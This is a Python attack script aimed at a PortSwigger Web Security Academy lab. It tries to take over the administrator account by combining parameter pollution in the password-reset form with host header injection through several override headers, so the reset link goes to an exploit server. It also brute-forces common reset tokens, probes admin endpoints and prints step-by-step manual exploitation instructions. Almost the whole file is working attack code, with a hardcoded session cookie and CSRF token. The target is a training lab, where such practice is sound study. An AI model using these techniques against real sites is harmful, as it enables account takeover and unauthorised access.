#!/usr/bin/env python3
import requests
import time
import re

# Target URLs
base_url = "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net"
forgot_url = f"{base_url}/forgot-password"
reset_url = f"{base_url}/forgot-password"  # Where we check for reset form
login_url = f"{base_url}/login"

# Session cookie
session = "34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "*/*"
}

print("Admin Account Takeover Exploit")
print("=" * 40)

# Step 1: Use parameter pollution to target admin but with host header injection
print("\n1. Triggering password reset for administrator...")

# We need to use the exploit server URL from the lab - typically exploit-0a...web-security-academy.net
# For now, let's try with a generic payload and see what happens

# Try different Host Header Injection techniques
host_headers = [
    {"Host": "exploit-server.web-security-academy.net"},
    {"X-Forwarded-Host": "exploit-server.web-security-academy.net"},
    {"X-Forwarded-Server": "exploit-server.web-security-academy.net"},
    {"X-HTTP-Host-Override": "exploit-server.web-security-academy.net"},
    {"X-Original-URL": "http://exploit-server.web-security-academy.net"},
]

# Parameter pollution payload - second username overrides first
# Use carlos,administrator to target admin account
payload = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator"

for i, host_header in enumerate(host_headers):
    try:
        test_headers = {**headers, **host_header}
        print(f"\nTrying method {i+1}: {list(host_header.keys())[0]}")

        response = requests.post(forgot_url, data=payload, headers=test_headers, verify=False, timeout=10)
        result = response.text

        print(f"Response: {result[:100]}...")

        if "normal-user.net" in result:
            print("✓ Targeting administrator account!")
        elif response.status_code == 403:
            print("✗ Blocked by security")
        else:
            print(f"? Status: {response.status_code}")

    except Exception as e:
        print(f"✗ Error: {str(e)[:50]}")

# Step 2: If we have an exploit server, we can set up a listener
print("\n2. Alternative approach - Check if we can access the reset directly...")

# Sometimes in PortSwigger labs, we can guess the reset token format
# or find it in predictable locations

# Check if there's a pattern in the reset tokens
print("\nTesting common reset token patterns...")

common_tokens = [
    "test",
    "admin",
    "administrator",
    "reset",
    "password",
    "token",
    "123456",
    "000000",
    "111111",
    "12345678"
]

for token in common_tokens:
    try:
        # Try accessing the reset page with common tokens
        reset_test_url = f"{base_url}/forgot-password?reset_token={token}"
        response = requests.get(reset_test_url, headers={"Cookie": f"session={session}"}, verify=False)

        if "password" in response.text.lower() and "reset" in response.text.lower() and response.status_code == 200:
            print(f"✓ Possible valid token: {token}")
            print(f"Response length: {len(response.text)}")

    except Exception as e:
        continue

print("\n3. Check for accessible reset functionality...")

# Step 3: Look for other ways to access admin functionality
# Check if we can directly access admin endpoints

admin_endpoints = [
    "/admin",
    "/administrator",
    "/admin.php",
    "/admin/",
    "/admin-panel",
    "/control-panel",
    "/management"
]

print("\nChecking for admin endpoints...")

for endpoint in admin_endpoints:
    try:
        url = f"{base_url}{endpoint}"
        response = requests.get(url, headers={"Cookie": f"session={session}"}, verify=False)

        if response.status_code == 200:
            print(f"✓ Found: {endpoint} (Status: {response.status_code})")
        elif response.status_code == 403:
            print(f"? Forbidden: {endpoint} (might exist)")
        elif response.status_code == 302:
            print(f"? Redirect: {endpoint} (Status: {response.status_code})")

    except Exception as e:
        continue

print("\n4. INSTRUCTIONS FOR MANUAL EXPLOITATION:")
print("-" * 45)
print("1. Access the PortSwigger lab's exploit server")
print("2. Set up a page to capture the reset token:")
print("   <script>")
print("   // Log the query parameters")
print("   console.log(window.location.search);")
print("   </script>")
print("")
print("3. Send this request to trigger admin reset:")
print(f"   POST {forgot_url}")
print("   Host: [YOUR-EXPLOIT-SERVER-URL]")
print("   Content-Type: application/x-www-form-urlencoded")
print(f"   Cookie: session={session}")
print("")
print("   Body: csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator")
print("")
print("4. Check exploit server logs for the reset token")
print("5. Use token to reset admin password")
print("6. Login as administrator with new password")

print(f"\nCurrent session: {session}")
print("Make sure to use this session throughout the attack!")